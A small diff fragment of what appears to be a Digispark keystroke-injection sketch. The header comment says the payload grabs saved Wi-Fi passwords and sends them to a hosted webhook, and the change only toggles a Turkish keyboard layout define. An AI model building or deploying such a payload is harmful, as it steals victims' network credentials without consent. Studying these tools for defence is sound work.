@@ -1,7 +1,8 @@
 /*
   Following payload will grab saved Wifi password and will send them to your hosted webhook.
 */
-#define kbd_tr_tr
+
+//#define kbd_tr_tr //For Turkish Q keyboard layout
 #include "DigiKeyboard.h"
 
 void setup() {
